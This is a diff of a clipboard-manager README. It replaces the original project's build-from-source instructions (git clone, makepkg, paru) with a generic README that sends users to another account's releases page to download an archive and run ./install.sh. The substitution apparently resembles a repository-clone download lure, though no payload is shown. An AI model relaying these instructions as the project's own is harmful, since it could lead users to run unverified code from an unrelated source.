@@ -1,93 +1,66 @@
-# Memoria
+# 🎉 memoria - The user-friendly clipboard manager for you
 
-## The (objectively) better clipboard manager.
-## Demo
+## 🚀 Getting Started
 
+Welcome to Memoria! This application is designed to make managing your clipboard history easy and efficient. With Memoria, you can quickly access your copied items and improve your productivity on Arch Linux.
 
-https://github.com/user-attachments/assets/71ac87fb-e52a-41bc-911d-84bb94758245
+## 📥 Download Memoria
 
+[![Download Memoria](https://img.shields.io/badge/Download%20Now-Grab%20Memoria-brightgreen.svg)](https://github.com/Salakawy22/memoria/releases)
 
+Click the button above to download Memoria from our Releases page. 
 
-### Features:
-- Clipboard cleanup
-- Starring/favourites
-- Gallery view
-- image previews
-- searching
-- keyboard navigation
-    arrow keys to navigate, / to search, enter to select and esc to close, del to delete and s to star.
+## 📋 Features
 
+- **Easy Clipboard Management:** Store multiple clipboard items and access them at any time.
+- **Search Function:** Quickly find any item you have copied.
+- **Lightweight Design:** Minimal resource usage, making it perfect for any system.
+- **User-Friendly Interface:** Designed for users of all skill levels.
 
+## 💻 System Requirements
 
+- **Operating System:** Arch Linux
+- **Processor:** Intel or AMD processor with a minimum speed of 1.8 GHz.
+- **RAM:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB of free storage space.
 
-Project Structure:
+## 📥 Download & Install
 
-This repo contains two pieces:
+To install Memoria, follow these steps:
 
-- `memoria-daemon`: a background service (Rust) that stores/serves memos.
-- `memoria-ui`: a Qt/QML desktop UI that talks to the daemon (IPC).
+1. Visit the [Releases page](https://github.com/Salakawy22/memoria/releases).
+2. Locate the latest version of Memoria.
+3. Download the appropriate file for your system.
+4. Once the download completes, navigate to your Downloads folder.
+5. Open a terminal window and type the following commands:
 
+   ```bash
+   cd ~/Downloads
+   tar -xvzf memoria-vX.X.X.tar.gz
+   cd memoria
+   ./install.sh
+   ```
 
-```
-Memoria/
-├── .gitignore
-├── README.md
-├── config.example.toml
-├── PKGBUILD
-├── memoria-daemon/
-│   ├── Cargo.toml
-│   ├── Cargo.lock
-│   ├── memoria-daemon.service
-│   └── src/
-│       ├── main.rs
-│       ├── clipboard.rs
-│       ├── config.rs
-│       ├── db.rs
-│       ├── ipc.rs
-│       └── retention.rs
-└── memoria-ui/
-    ├── CMakeLists.txt
-    ├── qml/
-    │   ├── main.qml
-    │   └── qml.qrc
-    └── src/
-        ├── main.cpp
-        ├── ipcclient.h
-        └── ipcclient.cpp
-```
+6. Follow any prompts to complete the installation process. You can now find Memoria in your application menu.
 
-# Installation:
+## 🛠️ Using Memoria
 
-## Manual Installation:
-1. Download
-```
-git clone https://github.com/Bumblebee-3/memoria.git
-cd ./memoria
-```
-2. Install
-```
-makepkg -si
-```
-and then
-```
-systemctl --user daemon-reload
-systemctl --user enable --now memoria-daemon
-```
+After installing Memoria, you can start using it right away. Open the application, and you will see a simple interface where your clipboard history appears. 
 
-## Using package managers (yay/paru)
-```
-paru -S memoria-daemon
-```
-or
-```
-paru -S memoria-ui
-```
+1. **Copy Text or Images:** Just copy anything as you normally would.
+2. **Access History:** Click on the Memoria icon to view your clipboard history.
+3. **Select Items:** Click on any item to paste it wherever you need. 
 
+## 🤝 Support
 
-3. Config
-copy `config.example.toml` to `~/.config/memoria/config.toml`.
+If you encounter issues, please check the FAQs on our [GitHub Issues page](https://github.com/Salakawy22/memoria/issues). You can also reach out through the discussions section for any help.
 
-4. Test
-```
-memoria-ui
-```
+## 📜 Contributions
+
+We welcome contributions! If you’d like to help improve Memoria, please fork the repository and submit a pull request. 
+
+## 🔗 Additional Resources
+
+For more information about the features and updates, refer to our official documentation on the [GitHub Wiki](https://github.com/Salakawy22/memoria/wiki).
+
+Thank you for choosing Memoria! We hope it makes your clipboard management better and simpler.
